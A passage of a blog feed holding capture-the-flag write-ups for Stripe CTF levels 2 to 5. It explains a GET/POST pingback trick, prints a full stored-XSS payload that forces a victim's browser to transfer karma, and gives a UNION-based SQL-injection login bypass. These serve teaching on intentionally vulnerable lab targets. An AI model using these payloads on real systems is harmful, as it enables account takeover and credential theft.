                                     &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;

    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Server responded with: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The server uses &lt;code&gt;params&lt;/code&gt; to recover the informations sent by
the form. Then it &lt;code&gt;POST&lt;/code&gt; s the username and the password to the
to the pingback URL. But &lt;code&gt;params&lt;/code&gt; is the Ruby equivalent of
&lt;code&gt;$_REQUEST&lt;/code&gt; in PHP, which recovers the informations sent by
&lt;code&gt;POST&lt;/code&gt;, but also by &lt;code&gt;GET&lt;/code&gt;. So let's say we put this as
a pingback URL:
&lt;code&gt;http://leve05-[numbers].stripe-ctf.com?pingback=http://level02-[numbers].stripe-ctf.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Okay, here is where it gets tricky: the server retrieves the previous
URL as a pingback. It then posts our username/password to it, i.e. to
itself, since the address is
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. So the server finds itself
with a username/password by &lt;code&gt;POST&lt;/code&gt;, and a pingback (the level
#2 URL) by &lt;code&gt;GET&lt;/code&gt;. So it does its business: sends the
username/password to the pingback.&lt;/p&gt;
&lt;p&gt;First we fill in the login:&lt;/p&gt;
&lt;img alt="level05-second-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-form.png" /&gt;
&lt;p&gt;Then we submit:&lt;/p&gt;
&lt;img alt="level05-second-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-login.png" /&gt;
&lt;p&gt;We clearly see here that the server was interrogated twice.&lt;/p&gt;
&lt;p&gt;And we just have to go back to the login page:&lt;/p&gt;
&lt;img alt="level05-w00t.png" class="align-center" src="/images/stripe-ctf-level-5/level05-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #4</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-4/" rel="alternate"></link><updated>2012-10-27T14:22:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:posts/2012/10/27/stripe-ctf-level-4/</id><summary type="html">&lt;img alt="level04-logo.jpg" class="align-center" src="/images/stripe-ctf-level-4/level04-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-4/stripe-ctf-level04.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants you to spread joy over the world. You have a certain
amount of karma you can distribute to people. But to be sure that you
only send karma to people you really trust to be good, everyone you send
karma to will be able to see your password. What's more, the user
karma_fountain is soooo good that he has infinite karma. Wouldn't it be
nice if you could get access to his account?&lt;/p&gt;
&lt;p&gt;Here, we can see that the user captain sent us one karma. Now, his
password, ''captain_password'', is visible to us.&lt;/p&gt;
&lt;img alt="level04-transfer_captain_cats.png" class="align-center" src="/images/stripe-ctf-level-4/level04-transfer_captain_cats.png" /&gt;
&lt;p&gt;So, all we have to do to get karma_fountain's password is to get him to
send us karma. Two ways for this: we could be so good that he'll want to
give us karma, or we can force him a little bit.&lt;/p&gt;
&lt;p&gt;So, what are our ways to interact with karma_fountain? The site doesn't
offer some kind of internal messaging, we don't have an email address...
All we can do is send karma_fountain some karma. Then, he'll see our
password on his profile page. Hmmm, our password will be written to its
profile page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File views/home.erb, line 52&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% @registered_users.each &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;% last_active = user[:last_active].strftime(&amp;#39;%H:%M:%S UTC&amp;#39;) %&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% if &lt;/span&gt;&lt;span class="vi"&gt;@trusts_me&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;%= user[:username] %&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;(password: &amp;lt;%=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;, last active &amp;lt;%= last_active %&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/li&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The password is not sanitized before it is displayed. Is it before it's
registered in the database?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 168&lt;/span&gt;
&lt;span class="no"&gt;DB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:users&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:karma&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;STARTING_KARMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:last_active&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nope. So if we put some javascript code as our password, and then we
send karma to karma_fountain, our password (i.e. the javascript code)
will be embedded in karma_fountain's page. If this javascript tells
karma_fountain's browser to send us karma, its password will be
displayed on our home page.&lt;/p&gt;
&lt;p&gt;So, let's create a user evil_hacker, with the following password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;form&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;action&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;transfer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;to_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cats&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;amount_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Okay, I know this code is way too long, but javascript is really not my
strong suit. Plus, there is the problem that once karma_fountain's
browser executes the javascript, the transfer will take place, then
karma_fountain will be redirected to its homepage, where the transfer
will take place etc. Not very sly. So, there is room for improvement on
this code. It's just to demonstrate the attack.&lt;/p&gt;
&lt;img alt="level04-evil_hacker_register.png" class="align-center" src="/images/stripe-ctf-level-4/level04-evil_hacker_register.png" /&gt;
&lt;p&gt;We connect as evil_hacker and send one karma to karma_fountain. Then,
we wait for him to connect (the CTF staff had put up a bot which would
look at its profile page every five minutes). Let's look at our profile:&lt;/p&gt;
&lt;img alt="level04-w00t.png" class="align-center" src="/images/stripe-ctf-level-4/level04-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #3</title><link href="https://allyourbase.utouch.fr/posts/2012/10/26/stripe-ctf-level-3/" rel="alternate"></link><updated>2012-10-26T23:34:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-26:posts/2012/10/26/stripe-ctf-level-3/</id><summary type="html">&lt;img alt="level03-logo.png" class="align-center" src="/images/stripe-ctf-level-3/level03-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-3/level03-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The company who built the vault of level 0 learned its lesson: you now
have to identify before accessing your guarded secrets.&lt;/p&gt;
&lt;p&gt;The company kindly tells you that other users have already chosen to
use their product, and even what the stored secrets are.&lt;/p&gt;
&lt;img alt="level03-index.png" class="align-center" src="/images/stripe-ctf-level-3/level03-index.png" /&gt;
&lt;p&gt;Sorry for math and physics fan, but we'll focus on bob's secret.&lt;/p&gt;
&lt;p&gt;So, let's look at the code used to identify users:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File secretvault.py, line 74&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide username&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide password&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;users.db&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM users&lt;/span&gt;
&lt;span class="s"&gt;            WHERE username = &amp;#39;{0}&amp;#39; LIMIT 1&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;There&amp;#39;s no such user {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;

    &lt;span class="n"&gt;calculated_hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;calculated_hash&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;That&amp;#39;s not the password for {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_id&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow. Hashed passwords, and even salt! Seems pretty secure. But the
statements aren't prepared: they are vulnerable to SQL injection. We are
gonna use a &lt;code&gt;UNION&lt;/code&gt; statement, to force the id, the password's
hash and the salt to be arbitrary values. We can see from the
&lt;code&gt;generate_data.py&lt;/code&gt; file that the default users were added in a
random order, so we don't know what bob's id is. Since there are only
three values, we can try each by hand. For the sake of simplicity, we'll
suppose here that bob's id is 1.&lt;/p&gt;
&lt;p&gt;So, let's say we put this as a user in the form:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dummy-user' UNION SELECT 1, 'hash', 'salt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The statement will become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;dummy-user&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;salt&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way, the first part of the statement will yield an empty row, and
the second part will yield 1, 'hash', 'salt'. If we want to connect with
the password 'foo', with the salt 'bar', we can compute the password's
hash:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sha256('foobar') =
c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We fill the form this way:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user = dummy-user' UNION SELECT 1,
'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
'bar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and&lt;/p&gt;
&lt;p&gt;&lt;code&gt;password = foo&lt;/code&gt;&lt;/p&gt;
&lt;img alt="level03-filled-form.png" class="align-center" src="/images/stripe-ctf-level-3/level03-filled-form.png" /&gt;
&lt;p&gt;We just have to submit to retrieve bob's secret:&lt;/p&gt;
&lt;img alt="level03-w00t.png" class="align-center" src="/images/stripe-ctf-level-3/level03-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #2</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-2/" rel="alternate"></link><updated>2012-10-13T16:11:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-2/</id><summary type="html">&lt;img alt="level02-logo.png" class="align-center" src="/images/stripe-ctf-level-2/level02-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-2/level02-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;d175b624ed888badd795c5474ae855f711e856cc41c0757059594babe8f23413&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a whole social network!&lt;/p&gt;
&lt;p&gt;Okay, it's not, it's just a page with a profile picture. But on the
bottom of the page, you can see something interesting: &amp;quot;Password for
Level 3 (accessible only to members of the club)&amp;quot;. Of course, if you
click on it it doesn't work. Let's see how we can access this file.&lt;/p&gt;
&lt;p&gt;The key here is that you can upload your picture so that it's displayed
on your profile page.&lt;/p&gt;
&lt;img alt="level02-uploaded-picture.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-picture.png" /&gt;
&lt;p&gt;But if you look at the code, you can see that no check is performed on
the file you upload. Which means you can upload &lt;strong&gt;any&lt;/strong&gt; file, not just a
picture.&lt;/p&gt;
